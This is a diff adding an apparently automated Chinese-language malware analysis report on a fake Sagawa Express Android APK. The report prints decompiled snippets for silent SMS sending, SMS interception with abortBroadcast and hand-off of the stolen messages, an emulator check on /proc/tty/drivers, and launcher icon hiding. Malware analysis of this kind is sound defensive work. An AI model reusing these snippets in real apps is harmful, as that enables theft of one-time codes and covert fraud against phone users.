@@ -1,0 +1,156 @@
+{
+  "APK信息": {
+    "文件名": "ca112c63ec11491bea459353299f155fd580e18a1beae99d89f9e4c1ad1eec55.apk",
+    "sha256": "ca112c63ec11491bea459353299f155fd580e18a1beae99d89f9e4c1ad1eec55",
+    "包名": "fu.cu",
+    "应用名": "佐川急便",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 330.2
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "sendTextMessage",
+              "SmsManager"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lkk\\util\\SmsUtil;",
+          "method_signature": "for(String msg : msgs)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager smsManager = SmsManager.getDefault();\nList<String> msgs = smsManager.divideMessage(notificationTitle);\nfor (String msg : msgs) {\n    smsManager.sendTextMessage(phone, null, msg, sentPI, null);\n}\nsmsManager.sendTextMessage(phone, null, notificationTitle, sentPI, null);",
+          "malicious_code_snippet_context": "      public static SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n  \n      public static void sendSMSTO(Context context, String phone, String notificationTitle) {\n>>>         SmsManager smsManager = SmsManager.getDefault();\n>>>         Intent sentIntent = new Intent();\n>>>         PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, sentIntent, 0);\n>>>         if (notificationTitle.length() > 70) {\n>>>             List<String> msgs = smsManager.divideMessage(notificationTitle);\n>>>             for (String msg : msgs) {\n                  smsManager.sendTextMessage(phone, null, msg, sentPI, null);\n              }\n              return;",
+          "behavior_description": "代码通过 SmsManager 的 sendTextMessage 方法在后台静默发送短信，无需用户交互。短信内容和目标号码由方法参数传入，可能被用于短信欺诈或发送扣费短信，直接造成用户经济损失。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lkk\\receiver\\LJ;",
+          "method_signature": "for(Object pdu : pdus)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Object[] pdus = (Object[]) intent.getExtras().get(\"pdus\");\nif (intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\") || intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED_2\") || intent.getAction().equals(\"android.provider.Telephony.GSM_SMS_RECEIVED\")) {\n    for (Object pdu : pdus) {\n        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);\n        this.content += smsMessage.getMessageBody();\n        this.sender = smsMessage.getOriginatingAddress();\n        this.time = smsMessage.getTimestampMillis();\n    }\n    abortBroadcast();\n    context.startService(new Intent(context, FUK.class));\n    Intent in = new Intent(context, ShC.class);\n    in.putExtra(\"sender\", this.sender);\n    in.putExtra(\"content\", this.content);\n    in.putExtra(\"time\", this.df.format(Long.valueOf(this.time)));\n    context.startService(in);\n    new Thread() {\n        public void run() {\n            JSONObject js = new JSONObject();",
+          "malicious_code_snippet_context": "      /* JADX WARN: Type inference failed for: r4v14, types: [kk.receiver.LJ$1] */\n      @Override // android.content.BroadcastReceiver\n      public void onReceive(final Context context, Intent intent) {\n>>>         Object[] pdus = (Object[]) intent.getExtras().get(\"pdus\");\n>>>         this.content = \"\";\n>>>         if (intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\") || intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED_2\") || intent.getAction().equals(\"android.provider.Telephony.GSM_SMS_RECEIVED\")) {\n>>>             for (Object pdu : pdus) {\n>>>                 SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);\n>>>                 this.content += smsMessage.getMessageBody();\n>>>                 this.sender = smsMessage.getOriginatingAddress();\n>>>                 this.time = smsMessage.getTimestampMillis();\n>>>             }\n>>>             this.sp = new SPUtil(context, \"mybank\");\n>>>             abortBroadcast();\n>>>             context.startService(new Intent(context, (Class<?>) FUK.class));\n>>>             Intent in = new Intent(context, (Class<?>) ShC.class);\n>>>             in.putExtra(\"sender\", this.sender);\n>>>             in.putExtra(\"content\", this.content);\n>>>             in.putExtra(\"time\", this.df.format(Long.valueOf(this.time)));\n>>>             context.startService(in);\n>>>             new Thread() { // from class: kk.receiver.LJ.1\n                  @Override // java.lang.Thread, java.lang.Runnable\n            ",
+          "behavior_description": "该代码注册为SMS广播接收器，监听android.provider.Telephony.SMS_RECEIVED等多种短信接收Action。当收到短信时，从Intent中提取PDU数据并解析出短信内容(content)、发送方号码(sender)和时间戳(time)。随后调用abortBroadcast()中止广播继续传递，使系统默认短信应用和用户无法看到该短信。拦截到的短信内容被传递给恶意Service(FUK和ShC)进行进一步处理，同时在新线程中构建JSONObject准备将短信数据上传至C2服务器。这是典型的银行木马短信拦截行为，用于窃取验证码/OTP、银行通知短信等敏感信息。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "anti_detection",
+      "中文名": "反检测/对抗技术",
+      "MITRE": "T1426",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "anti_emulator",
+          "中文名": "反模拟器",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "goldfish"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lkk\\util\\JRunCheck;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "anti_detection",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "private static String[] known_qemu_drivers = {\"goldfish\"};\npublic boolean isDeviceRooted(Context context) {\n    return checkRootMethod1() || checkRootMethod2() || checkRootMethod3() || isEmu().booleanValue();\n}\nprivate static Boolean isEmu() {\n    File driver_file = new File(\"/proc/tty/drivers\");\n    if (driver_file.exists() && driver_file.canRead()) {\n        byte[] data = new byte[(int) driver_file.length()];",
+          "malicious_code_snippet_context": "  \n  /* loaded from: classes.dex */\n  public class JRunCheck {\n>>>     private static String[] known_qemu_drivers = {\"goldfish\"};\n>>> \n>>>     public boolean isDeviceRooted(Context context) {\n>>>         return checkRootMethod1() || checkRootMethod2() || checkRootMethod3() || isEmu().booleanValue();\n>>>     }\n>>> \n>>>     private static Boolean isEmu() {\n>>>         File driver_file = new File(\"/proc/tty/drivers\");\n          if (driver_file.exists() && driver_file.canRead()) {\n              byte[] data = new byte[(int) driver_file.length()];\n              try {",
+          "behavior_description": "代码通过读取本地系统文件 /proc/tty/drivers 的内容，并检查其中是否包含 \"goldfish\" 等已知的 QEMU 模拟器驱动特征字符串，以此来判断应用是否运行在模拟器或沙箱环境中，从而规避安全分析。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lkk\\chunyu\\MainActivity;",
+          "method_signature": "onStop()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "ComponentName name = new ComponentName(getPackageName(), getClass().getName());\ngetPackageManager().setComponentEnabledSetting(name, 2, 0);",
+          "malicious_code_snippet_context": "      @Override // android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity, android.app.Activity\n      public void onStop() {\n          super.onStop();\n>>>         ComponentName name = new ComponentName(getPackageName(), getClass().getName());\n>>>         getPackageManager().setComponentEnabledSetting(name, 2, 0);\n      }\n  \n      private boolean checkPermissionAllGranted(String[] permissions) {",
+          "behavior_description": "在Activity的onStop()生命周期中，获取当前应用包名和类名构建ComponentName，并调用setComponentEnabledSetting将其设置为禁用状态(2)，从而隐藏应用图标，使用户无法在桌面看到并卸载该应用，实现隐蔽驻留。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
